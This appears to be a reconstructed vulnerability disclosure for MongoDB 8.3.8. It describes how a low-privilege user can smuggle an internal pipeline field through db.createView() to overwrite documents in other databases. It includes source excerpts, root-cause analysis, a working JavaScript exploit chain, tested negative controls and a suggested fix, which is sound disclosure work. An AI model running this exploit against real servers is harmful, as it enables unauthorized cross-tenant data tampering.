# MongoDB 8.3.8 — `$_internalSearchIdLookup.viewPipeline` authorization bypass → cross-database `$merge` write via `db.createView()`

**Date:** originally found and live-confirmed earlier in this research program; reconstructed
2026-08-28 after a container reset lost the unpushed working tree (see recovery note).

> **Recovery note (2026-08-28):** the original write-up's captured server log excerpts and the
> exact wording of the two negative-control error messages were lost when this session's container
> was recycled before a successful push. This document reconstructs the finding from this program's
> own conversation record (which quoted the exploit chain, error codes, and before/after document
> states verbatim at the time) and **re-verifies every file/line citation below against a fresh
> checkout of the exact `r8.3.8` commit** (`d100bf19961251f273e1d0bd8ce66fc60634f53c`, pulled via
> `git fetch` from `github.com/mongodb/mongo`). The `poc.py` reproduction script needs to be
> regenerated and re-run once a live 8.3.8 `mongod` instance is available again in this environment.

## Severity: Critical — CWE-862 (Missing Authorization) / CWE-863 (Incorrect Authorization)

A user holding **only** ordinary `readWrite` on one collection (`evilDB.foo`) and database-level
`createCollection`/`listCollections` on `evilDB` — nothing on any other database — can overwrite or
insert arbitrary documents in **any** ordinary collection in **any** other database on the same
`mongod`, by smuggling an internal-only pipeline field through `db.createView()`.

## Root cause

`$_internalSearchIdLookup`'s `viewPipeline` field is documented in its own guard comment as
"an internal field injected by the router" and is supposed to be rejected from external clients,
since it runs an arbitrary sub-pipeline with no fresh authorization check:

```cpp
// src/mongo/db/pipeline/search/lite_parsed_internal_search_id_lookup.h:75-81
// 'viewPipeline' is an internal field injected by the router. Reject it from external
// clients, since it runs an arbitrary sub-pipeline without an authorization re-check.
if (idlSpec.getViewPipeline() && opts.opCtx) {
    assertAllowedInternalIfRequired(opts.opCtx,
                                    DocumentSourceIdLookupSpec::kViewPipelineFieldName,
                                    AllowedWithClientType::kInternal);
}
```

The guard is correct **when it runs** — but it's conditioned on `opts.opCtx` being non-null, and
`LiteParserOptions::opCtx` defaults to `nullptr` (`lite_parsed_document_source.h:83`).
`db.createView()`'s own validation path never supplies it:

```cpp
// src/mongo/db/views/view_catalog_helpers.cpp:78
const LiteParsedPipeline liteParsedPipeline(viewDef.viewOn(), viewDef.pipeline());
```
— no `LiteParserOptions` argument, so every stage in a view's pipeline is lite-parsed with
`opCtx == nullptr`, and the `viewPipeline` guard silently no-ops.

A second, independent gap means the smuggled stages are also invisible to the authorization layer
entirely, not merely under-checked: `LiteParsedInternalSearchIdLookUp` inherits the default
`getInvolvedNamespaces()`/`requiredPrivileges()`/`requiresAuthzChecks()` from
`LiteParsedDocumentSourceDefault` (`lite_parsed_document_source.h:721-736`) — an empty namespace
set, an empty privilege vector, and `requiresAuthzChecks() == false` — without overriding any of
them to account for `viewPipeline`'s contents. The authorization check that runs at view-creation
time (`getPrivilegesForAggregate`'s per-stage loop) therefore reports **zero** required privileges
for the entire smuggled sub-pipeline, not merely the wrong ones.

Third: `LiteParsedPipeline::checkStagesAllowedInViewDefinition()`
(`lite_parsed_pipeline.cpp:189-202`) only excludes `$rankFusion`/`$scoreFusion`
(`isHybridSearchStage()`) and `$score` from view definitions — `$_internalSearchIdLookup` is not on
that list, so it's syntactically legal inside a view pipeline at all.

At execution time, the smuggled `viewPipeline` is appended, unchecked, to the id-lookup's own
sub-pipeline and runs with the outer query's already-authorized expression context — no
re-authorization of any kind:
```cpp
// src/mongo/db/exec/agg/search/internal_search_id_lookup_stage.cpp:130-144
// Find the document by performing a local read.
...
auto pipeline = pipeline_factory::makePipeline({BSON("$match" << documentKey)}, pExpCtx, pipelineOpts);
if (_spec.getViewPipeline()) {
    // When search query is being run on a view, we append the view pipeline to
    // the end of the idLookup's subpipeline. ...
    pipeline->appendPipeline(pipeline_factory::makePipeline(
        _spec.getViewPipeline().get(), pExpCtx, pipelineOpts));
}
```

## Why the write path is exploitable but the read path (`$lookup`) is not

`AggExState::resolveInvolvedNamespaces()` builds the pipeline's `resolvedNamespaces` map strictly
from the *outer* pipeline's `getInvolvedNamespaces()` — since `$_internalSearchIdLookup` never
lite-parses `viewPipeline`'s contents (the exact gap above), any namespace referenced only inside
the smuggled sub-pipeline is never added to that map. A `$lookup` (or `$graphLookup`/`$unionWith`)
embedded in `viewPipeline` calls `ExpressionContext::getResolvedNamespace()` when building its
sub-pipeline, which hard-`tassert`s if the namespace isn't present — logged as a "Tripwire
assertion," not fatal to the process, but the read attempt fails cleanly with no data leaked.
`$merge`/`$out`, by contrast, resolve/open their `into` target directly and never consult that map
at all — that asymmetry is exactly what makes the *write* path exploitable where the *read* path
isn't.

## Confirmed exploit chain

```js
// attacker: readWrite on evilDB.foo ONLY, createCollection at evilDB db-level.
// Zero privilege on otherTenantDB at any scope.

db.foo.insertOne({_id: 1})

db.createView("evilViewCrossDB", "foo", [
  { $_internalSearchIdLookup: {
      viewPipeline: [
        { $match: { _id: 1 } },
        { $project: { _id: { $literal: 1 },
                      balance: { $literal: 999999999 },
                      owner: { $literal: "PWNED cross-tenant, cross-DB, zero privilege" } } },
        { $merge: { into: { db: "otherTenantDB", coll: "victim" },
                    on: "_id", whenMatched: "replace", whenNotMatched: "insert" } }
      ]
  } }
])
// createView succeeds -- both guards above are skipped

db.evilViewCrossDB.find()
// fires the smuggled $merge; otherTenantDB.victim overwritten
```

Before: `otherTenantDB.victim` = `{_id: 1, balance: 1000, owner: "someone-else"}`.
After: `otherTenantDB.victim` = `{_id: 1, balance: 999999999, owner: "PWNED cross-tenant,
cross-DB, zero privilege"}`. The attacker's actual granted privileges (confirmed via `usersInfo
... showPrivileges` in the original run) were scoped to `{db: "evilDB", collection: "foo"}` plus
db-level `createCollection`/`listCollections` — never `otherTenantDB` in any form.

## Tested and blocked — the primitive is a bounded write, not a route to superuser

- `$currentOp` embedded in `viewPipeline` — structurally requires `{aggregate: 1}` against the
  `admin` database, which can't be satisfied from a view's own collection namespace regardless of
  this bypass.
- `$merge`/`$out` targeting `admin.system.users`/`admin.system.roles` — rejected by MongoDB's own
  hardcoded special-collection denylist (`Location31319: Cannot $merge to special collection:
  ...`), independent of authorization.
- `$out` into any collection in the `admin` database generally — rejected at a broader level
  (`Location31321: Can't $out to internal database: admin`).
- `$lookup` cross-db `{from: {db, coll}}` syntax against `system.*` — independently rejected before
  namespace resolution even runs.
- Nested `$lookup`/`$graphLookup` reads (same-database or cross-database) — fail identically via
  the `tassert` described above (`Location9453000`-shaped: "No resolved namespace provided for
  ...") — confirmed as a structural property of the `resolvedNamespaces` map, not something
  specific to cross-database targets.

Full superuser privilege escalation via direct RBAC-table tampering was attempted and is **not**
achievable through this vector — reported as a tested negative, not a caveat being glossed over.
Severity stands at Critical for the write-primitive itself (arbitrary cross-tenant document
overwrite on any *ordinary* database/collection); it does not extend to unconditional superuser
takeover.

## Suggested fix

1. Treat `opts.opCtx == nullptr` as "cannot prove this is an internal caller" and deny, not skip —
   i.e. require `opCtx` to be present before even reaching the internal-client check, rather than
   only running the check when it happens to be present.
2. Defense in depth: make `LiteParsedInternalSearchIdLookUp` recurse into `viewPipeline` as a real
   `LiteParsedPipeline` (mirroring `$lookup`'s own sub-pipeline handling via
   `lite_parsed_document_source_nested_pipelines.h`), so `getInvolvedNamespaces()`/
   `requiredPrivileges()` see its contents regardless of which stage type is embedded inside it —
   this closes the gap for `$merge`/`$out` specifically and would also cause the `$lookup` read
   attempt to fail with a clear authorization error up front instead of an internal tripwire
   assertion.

## Relationship to other findings in this program

This is the exact vulnerability `SERVER-129936` ("[v8.3] Tighten validation of $idLookup internal
fields") *tried* to fix — that commit added the `if (idlSpec.getViewPipeline() && opts.opCtx)`
guard quoted above (before it, there was no check on this field at all) and separately fixed the
mongos direct-`aggregate` path (`src/mongo/s/commands/query_cmd/cluster_pipeline_cmd.h`) to supply
a real `opCtx` — but never touched `view_catalog_helpers.cpp`'s own construction. See
`../recent-hardening-commits-sibling-bug-hunt-2026-08-24.md` for the primary-source commit-history
confirmation of this incomplete-fix timeline, and
`../createview-null-opctx-bypass-class-closure-sweep.md` for the systematic sweep confirming this
is the *only* stage/field in the 8.3.8 tree using this exact vulnerable shape.

## Files (need regeneration once a live 8.3.8 instance is available)

- `poc.py` — the exploit chain above, plus the negative controls (`system.users` target, `$lookup`
  read attempt), driven via `pymongo`.

**Destructive-use warning:** this PoC performs a real cross-database write. Only run it against a
disposable, isolated instance you control.
